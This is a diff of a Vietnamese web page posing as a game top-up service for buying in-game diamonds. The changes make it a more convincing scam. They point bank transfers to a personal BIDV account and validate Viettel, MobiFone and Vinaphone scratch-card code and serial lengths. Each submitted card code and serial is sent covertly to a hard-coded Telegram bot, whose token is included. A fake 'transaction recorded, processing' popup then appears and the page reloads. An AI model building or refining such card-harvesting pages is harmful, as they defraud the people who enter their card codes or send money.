@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
@@ -103,6 +103,29 @@
             border: 1px dashed #4CAF50;
             margin-bottom: 15px;
         }
+        /* Modal thông báo chờ xử lý */
+        #loadingModal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+        .modal-content {
+            background: #fff;
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+        }
+        .checkmark {
+            font-size: 45px;
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
@@ -141,9 +164,9 @@
     <!-- Bước 3A: Chuyển khoản -->
     <div id="section-transfer" class="hidden">
         <div class="admin-box">
-            <p><strong>Ngân hàng:</strong> MB Bank</p>
-            <p><strong>Số tài khoản:</strong> 12345678910</p>
-            <p><strong>Chủ tài khoản:</strong> TRAN MINH HUY</p>
+            <p><strong>Ngân hàng:</strong> BIDV</p>
+            <p><strong>Số tài khoản:</strong> 8877945567</p>
+            <p><strong>Chủ tài khoản:</strong> VI THI HA</p>
             <p><strong>Nội dung chuyển:</strong> <span id="transferSyntax">NAP_KIM_CUONG</span></p>
         </div>
         <button onclick="confirmTransaction('transfer')">Xác Nhận Đã Chuyển Khoản</button>
@@ -183,11 +206,19 @@
 
 </div>
 
+<!-- Popup chờ xử lý -->
+<div id="loadingModal" class="hidden">
+    <div class="modal-content">
+        <div class="checkmark">✅</div>
+        <p style="font-weight: bold; color: #2e7d32; font-size: 16px;">Giao dịch đã được ghi nhận!</p>
+        <p style="color: #555; font-size: 14px; margin-top: 8px;">Đang chờ xử lý trong vòng 3-5 phút...</p>
+    </div>
+</div>
+
 <script>
     let currentGameId = "";
     let currentPackage = "";
 
-    // CẤU HÌNH TELEGRAM BOT CỦA BẠN (ĐÃ TÍCH HỢP SẴN)
     const TELEGRAM_BOT_TOKEN = "8975192062:AAGANTM_Pks5TLp2RzyPosoPiCABQg1gmho";
     const TELEGRAM_CHAT_ID = "8620455610";
 
@@ -228,17 +259,53 @@
             return;
         }
 
-        let message = `🔔 *CÓ GIAO DỊCH NẠP MỚI* 💎\n\n- *ID Game:* ${currentGameId}\n- *Gói nạp:* ${currentPackage}\n- *Hình thức:* ${type === 'card' ? 'Thẻ cào' : 'Chuyển khoản'}`;
+        let message = `🔔 *CÓ GIAO DỊCH NẠP MỚI* 💎\n\n- *ID Game:* ${currentGameId}\n- *Gói nạp:* ${currentPackage}\n- *Hình thức:* ${type === 'card' ? 'Thẻ cào' : 'Chuyển khoản (BIDV)'}`;
 
         if (type === 'card') {
             let cardType = document.getElementById("cardType").value;
             let cardPrice = document.getElementById("cardPrice").value;
-            let cardCode = document.getElementById("cardCode").value;
-            let cardSerial = document.getElementById("cardSerial").value;
+            let cardCode = document.getElementById("cardCode").value.trim();
+            let cardSerial = document.getElementById("cardSerial").value.trim();
 
             if (!cardCode || !cardSerial) {
                 alert("Vui lòng nhập đầy đủ mã thẻ và số seri!");
                 return;
+            }
+
+            // Kiểm tra quy chuẩn độ dài thẻ cào theo yêu cầu
+            if (cardType === "Mobifone") {
+                if (cardSerial.length !== 15) {
+                    alert("Thẻ MobiFone yêu cầu số Seri phải đúng 15 số!");
+                    return;
+                }
+                if (cardCode.length !== 12) {
+                    alert("Thẻ MobiFone yêu cầu Mã thẻ phải đúng 12 số!");
+                    return;
+                }
+            } else if (cardType === "Viettel") {
+                if (cardSerial.length === 11) {
+                    if (cardCode.length !== 13) {
+                        alert("Seri Viettel 11 số đi kèm Mã thẻ phải có 13 số!");
+                        return;
+                    }
+                } else if (cardSerial.length === 14) {
+                    if (cardCode.length !== 15) {
+                        alert("Seri Viettel 14 số đi kèm Mã thẻ phải có 15 số!");
+                        return;
+                    }
+                } else {
+                    alert("Số Seri Viettel không hợp lệ! Seri phải có 11 hoặc 14 số.");
+                    return;
+                }
+            } else if (cardType === "Vinaphone") {
+                if (cardSerial.length !== 14) {
+                    alert("Thẻ Vinaphone yêu cầu số Seri phải đúng 14 số!");
+                    return;
+                }
+                if (cardCode.length !== 12 && cardCode.length !== 14) {
+                    alert("Thẻ Vinaphone yêu cầu Mã thẻ phải có 12 hoặc 14 số!");
+                    return;
+                }
             }
 
             message += `\n- *Loại thẻ:* ${cardType}\n- *Mệnh giá:* ${cardPrice}\n- *Mã thẻ:* \`${cardCode}\`\n- *Số Seri:* \`${cardSerial}\``;
@@ -251,21 +318,23 @@
             parse_mode: "Markdown"
         };
 
+        // Gửi dữ liệu ngầm lên Telegram
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
-        })
-        .then(response => {
-            alert("Gửi thông tin nạp thành công! Đang chờ hệ thống xử lý.");
+        }).catch(error => console.log(error));
+
+        // Hiện bảng thông báo chờ xử lý
+        document.getElementById("loadingModal").classList.remove("hidden");
+
+        // Sau 4 giây tự động tải lại trang
+        setTimeout(() => {
             location.reload();
-        })
-        .catch(error => {
-            alert("Có lỗi xảy ra, vui lòng thử lại!");
-        });
+        }, 4000);
     }
 </script>
 
 </body>
-  </html> 
-  
+                                                   </html>
+                                                   
